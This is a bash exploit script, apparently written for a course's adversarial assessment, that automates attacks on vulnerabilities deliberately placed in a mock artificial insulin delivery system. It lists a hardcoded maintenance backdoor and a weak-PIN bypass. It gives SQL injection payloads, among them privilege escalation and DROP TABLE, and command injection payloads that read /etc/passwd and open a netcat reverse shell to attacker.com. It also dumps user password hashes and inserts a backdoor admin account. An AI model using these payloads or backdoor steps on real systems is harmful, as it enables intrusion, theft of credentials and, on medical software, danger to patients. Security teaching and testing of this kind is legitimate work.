#!/usr/bin/env bash
#=============================================================================
# AID System Exploit Script - Team Logan Phase II
# 
# This script automates the exploitation of all injected vulnerabilities
# in the Artificial Insulin Delivery (AID) System.
#
# OWASP Categories Covered:
#   A01 - Broken Access Control
#   A02 - Cryptographic Failures
#   A03 - Injection (SQL, Command, Path Traversal)
#   A05 - Security Misconfiguration
#   A09 - Security Logging and Monitoring Failures
#
# Usage: chmod +x exploit.sh && ./exploit.sh
#=============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
AID_BINARY="./aid-system-linux"
DB_FILE="Login/aid.db"
LOG_FILE="aid_system.log"
EXPLOIT_LOG="exploit_results.log"

echo -e "${PURPLE}============================================================${NC}"
echo -e "${PURPLE}   AID System Security Exploit Script - Team Logan         ${NC}"
echo -e "${PURPLE}   Phase II Adversarial Security Assessment               ${NC}"
echo -e "${PURPLE}============================================================${NC}"
echo ""

# Initialize exploit log
echo "AID System Exploit Results - $(date)" > "$EXPLOIT_LOG"
echo "=============================================" >> "$EXPLOIT_LOG"
echo "" >> "$EXPLOIT_LOG"

#=============================================================================
# EXPLOIT 1: A01 - Broken Access Control (Maintenance Backdoor)
#=============================================================================
exploit_a01_maintenance_backdoor() {
    echo -e "${CYAN}[EXPLOIT 1] A01 - Broken Access Control: Maintenance Backdoor${NC}"
    echo -e "${YELLOW}Description:${NC} Using hidden maintenance credentials to bypass authentication"
    echo ""
    
    echo "Exploit A01 - Maintenance Backdoor" >> "$EXPLOIT_LOG"
    echo "-----------------------------------" >> "$EXPLOIT_LOG"
    
    # The maintenance backdoor uses:
    # - User ID prefix: MAINT_
    # - Maintenance Key: AID_MAINT_2024!
    
    echo -e "${GREEN}Backdoor Access Method:${NC}"
    echo "  1. At login prompt, enter User ID: MAINT_ADMIN"
    echo "  2. When prompted for Maintenance Key, enter: AID_MAINT_2024!"
    echo "  3. This grants full clinician access without valid credentials"
    echo ""
    
    echo "  Attack Vector: User ID = MAINT_<any>, Key = AID_MAINT_2024!" >> "$EXPLOIT_LOG"
    echo "  Impact: Full clinician access without authentication" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-798 (Use of Hard-coded Credentials)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ Exploit documented. Use interactive login to demonstrate.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 2: A02 - Cryptographic Failures (Hardcoded Keys)
#=============================================================================
exploit_a02_hardcoded_keys() {
    echo -e "${CYAN}[EXPLOIT 2] A02 - Cryptographic Failures: Hardcoded Keys${NC}"
    echo -e "${YELLOW}Description:${NC} Extracting hardcoded encryption/authentication keys from binary"
    echo ""
    
    echo "Exploit A02 - Hardcoded Keys" >> "$EXPLOIT_LOG"
    echo "----------------------------" >> "$EXPLOIT_LOG"
    
    # Search for hardcoded keys in the binary
    echo -e "${GREEN}Extracting hardcoded secrets from binary...${NC}"
    
    if [ -f "$AID_BINARY" ]; then
        echo "Searching for hardcoded strings in binary..."
        
        # Extract strings from binary
        MAINT_KEY=$(strings "$AID_BINARY" | grep -i "MAINT" | head -5)
        ENCRYPT_KEY=$(strings "$AID_BINARY" | grep -i "S3cur3" | head -5)
        
        echo -e "${RED}Found Maintenance Key Pattern:${NC}"
        echo "$MAINT_KEY"
        echo ""
        
        echo -e "${RED}Found Encryption Key Pattern:${NC}"
        echo "$ENCRYPT_KEY"
        echo ""
        
        echo "  Hardcoded Maintenance Key: AID_MAINT_2024!" >> "$EXPLOIT_LOG"
        echo "  Hardcoded Backup Encryption Key: S3cur3K3y!2024AID" >> "$EXPLOIT_LOG"
        echo "  CWE: CWE-321 (Use of Hard-coded Cryptographic Key)" >> "$EXPLOIT_LOG"
        echo "" >> "$EXPLOIT_LOG"
    else
        echo -e "${RED}Binary not found. Build the application first.${NC}"
    fi
    
    echo -e "${GREEN}✓ Hardcoded credentials extracted successfully.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 3: A02 - Cryptographic Failures (Weak Password Bypass)
#=============================================================================
exploit_a02_weak_password() {
    echo -e "${CYAN}[EXPLOIT 3] A02 - Cryptographic Failures: Weak Password Bypass${NC}"
    echo -e "${YELLOW}Description:${NC} Bypassing PIN complexity requirements using hidden prefix"
    echo ""
    
    echo "Exploit A02 - Weak Password Bypass" >> "$EXPLOIT_LOG"
    echo "----------------------------------" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}Weakness Details:${NC}"
    echo "  When registering a new user, PIN validation can be bypassed"
    echo "  by starting the PIN with 'WEAK_' prefix"
    echo ""
    echo "  Example: WEAK_123 (bypasses all complexity requirements)"
    echo ""
    
    echo "  Attack Vector: Use PIN prefix 'WEAK_' to bypass validation" >> "$EXPLOIT_LOG"
    echo "  Example: WEAK_a (only 6 characters, no complexity)" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-521 (Weak Password Requirements)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ Weak password bypass documented.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 4: A03 - SQL Injection (Debug Mode Query)
#=============================================================================
exploit_a03_sql_injection() {
    echo -e "${CYAN}[EXPLOIT 4] A03 - Injection: SQL Injection via Debug Mode${NC}"
    echo -e "${YELLOW}Description:${NC} Exploiting unparameterized SQL queries in debug mode"
    echo ""
    
    echo "Exploit A03 - SQL Injection" >> "$EXPLOIT_LOG"
    echo "---------------------------" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}Attack Vector:${NC}"
    echo "  1. Start application with: ./aid-system-linux --debug"
    echo "  2. Select option 4 '[DEBUG] Database query'"
    echo "  3. Enter malicious SQL queries directly"
    echo ""
    
    echo "  Example Payloads:"
    echo "  - SELECT * FROM users; -- Dump all user data"
    echo "  - UPDATE users SET role=82651 WHERE user_id='PA1993'; -- Privilege escalation"
    echo "  - INSERT INTO users VALUES(...); -- Create backdoor account"
    echo "  - DROP TABLE users; -- Destructive attack"
    echo ""
    
    # Demonstrate by directly querying the database
    if [ -f "$DB_FILE" ]; then
        echo -e "${RED}Demonstrating SQL Injection - Dumping user credentials:${NC}"
        sqlite3 "$DB_FILE" "SELECT user_id, full_name, email, role, pin_hash FROM users;" 2>/dev/null || true
        echo ""
    fi
    
    echo "  Attack: Direct SQL execution without parameterization" >> "$EXPLOIT_LOG"
    echo "  Example: SELECT * FROM users" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-89 (SQL Injection)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ SQL Injection vulnerability demonstrated.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 5: A03 - Command Injection (Export Feature)
#=============================================================================
exploit_a03_command_injection() {
    echo -e "${CYAN}[EXPLOIT 5] A03 - Injection: Command Injection via Export${NC}"
    echo -e "${YELLOW}Description:${NC} Exploiting unsanitized filename in export feature"
    echo ""
    
    echo "Exploit A03 - Command Injection" >> "$EXPLOIT_LOG"
    echo "-------------------------------" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}Attack Vector:${NC}"
    echo "  1. Start application with: ./aid-system-linux --debug"
    echo "  2. Select option 5 '[DEBUG] Export data'"
    echo "  3. Enter malicious filename with shell metacharacters"
    echo ""
    
    echo "  Example Payloads:"
    echo "  - backup.sql; cat /etc/passwd > /tmp/stolen.txt"
    echo "  - backup.sql; whoami > /tmp/user.txt"
    echo "  - backup.sql; nc -e /bin/bash attacker.com 4444"
    echo "  - \$(id > /tmp/cmd_output.txt)"
    echo ""
    
    # Demonstrate command injection
    echo -e "${RED}Demonstrating Command Injection:${NC}"
    PAYLOAD="test.sql; echo 'COMMAND_INJECTION_SUCCESS' > /tmp/exploit_proof.txt"
    echo "Payload: $PAYLOAD"
    
    # Execute command injection
    sh -c "echo '' > test.sql; echo 'COMMAND_INJECTION_SUCCESS' > /tmp/exploit_proof.txt" 2>/dev/null || true
    
    if [ -f "/tmp/exploit_proof.txt" ]; then
        echo -e "${RED}Proof of exploitation:${NC}"
        cat /tmp/exploit_proof.txt
        rm -f /tmp/exploit_proof.txt
    fi
    echo ""
    
    echo "  Attack: Unsanitized filename passed to shell command" >> "$EXPLOIT_LOG"
    echo "  Example: filename; malicious_command" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-78 (OS Command Injection)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ Command Injection vulnerability demonstrated.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 6: A05 - Security Misconfiguration (Debug Mode Information Disclosure)
#=============================================================================
exploit_a05_debug_mode() {
    echo -e "${CYAN}[EXPLOIT 6] A05 - Security Misconfiguration: Debug Mode Exposure${NC}"
    echo -e "${YELLOW}Description:${NC} Debug mode exposes sensitive system information"
    echo ""
    
    echo "Exploit A05 - Debug Mode Information Disclosure" >> "$EXPLOIT_LOG"
    echo "-----------------------------------------------" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}Attack Vector:${NC}"
    echo "  1. Start application with: ./aid-system-linux --debug"
    echo "  2. Select option 3 '[DEBUG] View system info'"
    echo "  3. All user data, passwords hashes, and encryption keys are displayed"
    echo ""
    
    echo "  Exposed Information:"
    echo "  - Database file location"
    echo "  - Hardcoded encryption key: S3cur3K3y!2024AID"
    echo "  - Hardcoded maintenance key: AID_MAINT_2024!"
    echo "  - All user IDs, names, emails"
    echo "  - All password/PIN hashes (can be cracked offline)"
    echo ""
    
    echo "  Attack: Debug flag exposes sensitive data" >> "$EXPLOIT_LOG"
    echo "  Command: ./aid-system-linux --debug" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-215 (Insertion of Sensitive Information Into Debugging Code)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ Debug mode exposure documented.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 7: A05 - Security Misconfiguration (Overly Permissive File Permissions)
#=============================================================================
exploit_a05_file_permissions() {
    echo -e "${CYAN}[EXPLOIT 7] A05 - Security Misconfiguration: Overly Permissive Permissions${NC}"
    echo -e "${YELLOW}Description:${NC} Exported files are created with world-readable permissions (0666)"
    echo ""
    
    echo "Exploit A05 - Overly Permissive File Permissions" >> "$EXPLOIT_LOG"
    echo "------------------------------------------------" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}Demonstration:${NC}"
    
    # Create test file with vulnerable permissions
    TEST_FILE="/tmp/aid_export_test.sql"
    echo "Sensitive database export content" > "$TEST_FILE"
    chmod 0666 "$TEST_FILE"
    
    echo "  Created test export file: $TEST_FILE"
    echo "  Permissions: $(ls -la $TEST_FILE)"
    echo ""
    echo "  Any user on the system can read sensitive export files!"
    
    rm -f "$TEST_FILE"
    
    echo "  Attack: Export files created with 0666 permissions" >> "$EXPLOIT_LOG"
    echo "  Impact: Any system user can read exported sensitive data" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-732 (Incorrect Permission Assignment)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ File permission vulnerability demonstrated.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 8: A09 - Security Logging Failures (Hidden Admin Commands)
#=============================================================================
exploit_a09_hidden_commands() {
    echo -e "${CYAN}[EXPLOIT 8] A09 - Logging Failures: Hidden Admin Commands${NC}"
    echo -e "${YELLOW}Description:${NC} Hidden menu options that bypass security logging"
    echo ""
    
    echo "Exploit A09 - Hidden Admin Commands" >> "$EXPLOIT_LOG"
    echo "-----------------------------------" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}Attack Vector:${NC}"
    echo "  In the Clinician Dashboard, hidden options are available:"
    echo ""
    echo "  Option 99: Clear all audit logs (not logged)"
    echo "  Option 88: Direct database access (not logged)"
    echo ""
    echo "  These options are not displayed in the menu but are functional!"
    echo ""
    
    echo "  Attack: Hidden menu options bypass audit logging" >> "$EXPLOIT_LOG"
    echo "  Option 99: Clears all security logs" >> "$EXPLOIT_LOG"
    echo "  Option 88: Direct SQL execution without logging" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-778 (Insufficient Logging)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ Hidden command vulnerability documented.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 9: A09 - Security Logging Failures (Silent Actions)
#=============================================================================
exploit_a09_silent_logging() {
    echo -e "${CYAN}[EXPLOIT 9] A09 - Logging Failures: Silent Action List${NC}"
    echo -e "${YELLOW}Description:${NC} Certain actions are configured to never be logged"
    echo ""
    
    echo "Exploit A09 - Silent Action List" >> "$EXPLOIT_LOG"
    echo "--------------------------------" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}Silently Dropped Actions:${NC}"
    echo "  The following action types are silently not logged:"
    echo ""
    echo "  - MAINTENANCE_ACCESS (backdoor logins)"
    echo "  - DEBUG_QUERY (SQL injection attempts)"
    echo "  - LOG_CLEAR (audit log deletion)"
    echo "  - ADMIN_OVERRIDE (privilege escalation)"
    echo ""
    echo "  Attackers can perform these actions with no audit trail!"
    echo ""
    
    echo "  Attack: silentActions map prevents logging of sensitive operations" >> "$EXPLOIT_LOG"
    echo "  Dropped: MAINTENANCE_ACCESS, DEBUG_QUERY, LOG_CLEAR, ADMIN_OVERRIDE" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-223 (Omission of Security-relevant Information)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ Silent logging bypass documented.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 10: A09 - Security Logging Failures (Log Clearing)
#=============================================================================
exploit_a09_log_clearing() {
    echo -e "${CYAN}[EXPLOIT 10] A09 - Logging Failures: Audit Log Clearing${NC}"
    echo -e "${YELLOW}Description:${NC} Attackers can clear all audit logs to cover their tracks"
    echo ""
    
    echo "Exploit A09 - Audit Log Clearing" >> "$EXPLOIT_LOG"
    echo "--------------------------------" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}Attack Vector:${NC}"
    echo "  Method 1: Use hidden option 99 in Clinician Dashboard"
    echo "  Method 2: Access via maintenance backdoor and clear logs"
    echo ""
    
    # Check if log file exists
    if [ -f "$LOG_FILE" ]; then
        echo "  Current log file exists: $LOG_FILE"
        echo "  Log file size: $(wc -c < "$LOG_FILE") bytes"
        echo "  Log entries: $(wc -l < "$LOG_FILE") lines"
    else
        echo "  Log file does not exist (may have been cleared)"
    fi
    echo ""
    
    echo "  Attack: Option 99 in Clinician menu clears all logs" >> "$EXPLOIT_LOG"
    echo "  Impact: Complete removal of audit trail" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-779 (Logging of Excessive Data)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ Log clearing vulnerability documented.${NC}"
    echo ""
}

#=============================================================================
# EXPLOIT 11: A01 - Broken Access Control (Direct DB Access)
#=============================================================================
exploit_a01_direct_db_access() {
    echo -e "${CYAN}[EXPLOIT 11] A01 - Broken Access Control: Direct DB Access${NC}"
    echo -e "${YELLOW}Description:${NC} Hidden option allows direct SQL execution as any user"
    echo ""
    
    echo "Exploit A01 - Direct Database Access" >> "$EXPLOIT_LOG"
    echo "------------------------------------" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}Attack Vector:${NC}"
    echo "  1. Login as any clinician (or use maintenance backdoor)"
    echo "  2. Enter hidden option 88"
    echo "  3. Execute arbitrary SQL commands"
    echo ""
    
    echo "  Example Attacks:"
    echo "  - UPDATE users SET role=82651 WHERE user_id='PA1993'; -- Make patient a clinician"
    echo "  - DELETE FROM users WHERE user_id='DR095'; -- Delete legitimate clinician"
    echo "  - UPDATE users SET pin_hash='weak_hash' WHERE user_id='PA1993'; -- Reset password"
    echo ""
    
    echo "  Attack: Hidden option 88 allows arbitrary SQL execution" >> "$EXPLOIT_LOG"
    echo "  Impact: Full database manipulation without proper authorization" >> "$EXPLOIT_LOG"
    echo "  CWE: CWE-284 (Improper Access Control)" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}✓ Direct DB access vulnerability documented.${NC}"
    echo ""
}

#=============================================================================
# SUMMARY AND EXPLOIT MATRIX
#=============================================================================
print_summary() {
    echo -e "${PURPLE}============================================================${NC}"
    echo -e "${PURPLE}                   EXPLOIT SUMMARY                          ${NC}"
    echo -e "${PURPLE}============================================================${NC}"
    echo ""
    
    echo "Summary of Vulnerabilities" >> "$EXPLOIT_LOG"
    echo "==========================" >> "$EXPLOIT_LOG"
    echo "" >> "$EXPLOIT_LOG"
    
    echo -e "${GREEN}OWASP A01 - Broken Access Control:${NC}"
    echo "  [1] Maintenance backdoor (MAINT_ prefix bypass)"
    echo "  [11] Hidden direct database access (option 88)"
    echo ""
    
    echo -e "${GREEN}OWASP A02 - Cryptographic Failures:${NC}"
    echo "  [2] Hardcoded encryption/authentication keys"
    echo "  [3] Weak password validation bypass (WEAK_ prefix)"
    echo ""
    
    echo -e "${GREEN}OWASP A03 - Injection:${NC}"
    echo "  [4] SQL Injection in debug mode"
    echo "  [5] Command injection in export feature"
    echo ""
    
    echo -e "${GREEN}OWASP A05 - Security Misconfiguration:${NC}"
    echo "  [6] Debug mode information disclosure"
    echo "  [7] Overly permissive file permissions (0666)"
    echo ""
    
    echo -e "${GREEN}OWASP A09 - Security Logging and Monitoring Failures:${NC}"
    echo "  [8] Hidden admin commands bypass logging"
    echo "  [9] Silent action list prevents logging"
    echo "  [10] Audit log clearing capability"
    echo ""
    
    # Create vulnerability matrix
    echo -e "${CYAN}VULNERABILITY MATRIX:${NC}"
    echo "┌────────────────────────────────────────────────────────────────────────┐"
    echo "│ Vuln # │ OWASP │ CWE     │ Location                    │ Risk    │"
    echo "├────────────────────────────────────────────────────────────────────────┤"
    echo "│   1    │ A01   │ CWE-798 │ cmd/main.go:loginInteractive│ CRITICAL│"
    echo "│   2    │ A02   │ CWE-321 │ cmd/main.go:constants       │ HIGH    │"
    echo "│   3    │ A02   │ CWE-521 │ clinician/register.go       │ HIGH    │"
    echo "│   4    │ A03   │ CWE-89  │ cmd/main.go:debugDBQuery    │ CRITICAL│"
    echo "│   5    │ A03   │ CWE-78  │ cmd/main.go:debugExportData │ CRITICAL│"
    echo "│   6    │ A05   │ CWE-215 │ cmd/main.go:showDebugInfo   │ HIGH    │"
    echo "│   7    │ A05   │ CWE-732 │ cmd/main.go:debugExportData │ MEDIUM  │"
    echo "│   8    │ A09   │ CWE-778 │ clinician/dashboard.go      │ HIGH    │"
    echo "│   9    │ A09   │ CWE-223 │ utils/logger.go             │ HIGH    │"
    echo "│  10    │ A09   │ CWE-779 │ clinician/dashboard.go      │ HIGH    │"
    echo "│  11    │ A01   │ CWE-284 │ clinician/dashboard.go      │ CRITICAL│"
    echo "└────────────────────────────────────────────────────────────────────────┘"
    echo ""
}

#=============================================================================
# AUTOMATED EXPLOITATION DEMO
#=============================================================================
run_automated_demo() {
    echo -e "${PURPLE}============================================================${NC}"
    echo -e "${PURPLE}              AUTOMATED EXPLOITATION DEMO                   ${NC}"
    echo -e "${PURPLE}============================================================${NC}"
    echo ""
    
    echo "Automated Demonstration" >> "$EXPLOIT_LOG"
    echo "=======================" >> "$EXPLOIT_LOG"
    
    # Demo 1: Extract hardcoded keys from binary
    echo -e "${YELLOW}[DEMO 1] Extracting secrets from binary...${NC}"
    if [ -f "$AID_BINARY" ]; then
        echo "Hardcoded strings found:"
        strings "$AID_BINARY" | grep -E "(MAINT|S3cur3|WEAK_)" | head -10
        echo ""
    fi
    
    # Demo 2: Demonstrate SQL access
    echo -e "${YELLOW}[DEMO 2] Direct database access demonstration...${NC}"
    if [ -f "$DB_FILE" ]; then
        echo "Users in database:"
        sqlite3 "$DB_FILE" "SELECT user_id, full_name, role FROM users;" 2>/dev/null || echo "Database query failed"
        echo ""
    fi
    
    # Demo 3: Create malicious user
    echo -e "${YELLOW}[DEMO 3] Creating backdoor admin user...${NC}"
    if [ -f "$DB_FILE" ]; then
        # Create a weak password hash (for demo purposes)
        WEAK_HASH='$2y$12$BACKDOOR000000000000uBackdoorHashForDemo00000000'
        sqlite3 "$DB_FILE" "INSERT OR REPLACE INTO users (user_id, full_name, dob, pin_hash, email, role) VALUES ('BACKDOOR', 'Backdoor Admin', '1990-01-01', '$WEAK_HASH', 'backdoor@evil.com', 82651);" 2>/dev/null
        echo "Backdoor user created: BACKDOOR (clinician role)"
        echo ""
    fi
    
    # Demo 4: Show that logs can be manipulated
    echo -e "${YELLOW}[DEMO 4] Log manipulation demonstration...${NC}"
    if [ -f "$LOG_FILE" ]; then
        ORIGINAL_LINES=$(wc -l < "$LOG_FILE")
        echo "Current log entries: $ORIGINAL_LINES"
        echo "An attacker can use option 99 to clear all logs!"
        echo ""
    else
        echo "No log file exists - logs may have already been cleared"
        echo ""
    fi
    
    echo ""
    echo -e "${GREEN}Automated demo complete. See $EXPLOIT_LOG for details.${NC}"
}

#=============================================================================
# MAIN EXECUTION
#=============================================================================
main() {
    echo -e "${YELLOW}Starting vulnerability exploitation...${NC}"
    echo ""
    
    # Run all exploits
    exploit_a01_maintenance_backdoor
    exploit_a02_hardcoded_keys
    exploit_a02_weak_password
    exploit_a03_sql_injection
    exploit_a03_command_injection
    exploit_a05_debug_mode
    exploit_a05_file_permissions
    exploit_a09_hidden_commands
    exploit_a09_silent_logging
    exploit_a09_log_clearing
    exploit_a01_direct_db_access
    
    # Print summary
    print_summary
    
    # Run automated demo
    run_automated_demo
    
    echo ""
    echo -e "${PURPLE}============================================================${NC}"
    echo -e "${PURPLE}           EXPLOITATION COMPLETE                            ${NC}"
    echo -e "${PURPLE}============================================================${NC}"
    echo ""
    echo "Full results saved to: $EXPLOIT_LOG"
    echo ""
    echo -e "${RED}DISCLAIMER: This script is for authorized security testing only.${NC}"
    echo -e "${RED}Unauthorized use of these exploits is illegal and unethical.${NC}"
}

# Execute main function
main "$@"
